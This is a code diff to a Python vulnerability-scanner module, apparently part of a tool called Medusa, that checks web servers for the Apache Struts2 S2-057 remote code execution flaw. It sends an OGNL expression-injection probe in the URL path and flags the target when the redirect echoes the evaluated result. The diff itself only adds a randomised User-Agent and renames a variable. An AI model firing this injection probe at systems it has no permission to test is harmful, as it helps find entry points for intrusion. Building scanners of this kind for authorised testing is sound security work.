@@ -19,8 +19,8 @@ def UrlProcessing(url):
 payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''
 
 
-def S2_057(arg):
-    scheme, url, port = UrlProcessing(arg)
+def S2_057(Url,RandomAgent):
+    scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
     elif port is None and scheme == 'http':
@@ -34,7 +34,7 @@ def S2_057(arg):
         'Accept-Encoding': 'gzip, deflate',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
+        'User-Agent': RandomAgent,
         'Connection': 'close',
         'DNT': '1',
         'Upgrade-Insecure-Requests': '1'
@@ -45,7 +45,7 @@ def S2_057(arg):
         con = resp.headers['Location']
         code = resp.status_code
         if code==302 and con.lower().find('54289')!=-1:
-            vul = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:版本低于<=Struts2_3_34,Struts2_5_16\r\nPayload:{}\r\n".format(url, payload_url)
-            return (vul)
+            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:版本低于<=Struts2_3_34,Struts2_5_16\r\nPayload:{}\r\n".format(url, payload_url)
+            return (Medusa)
     except Exception as e:
         pass
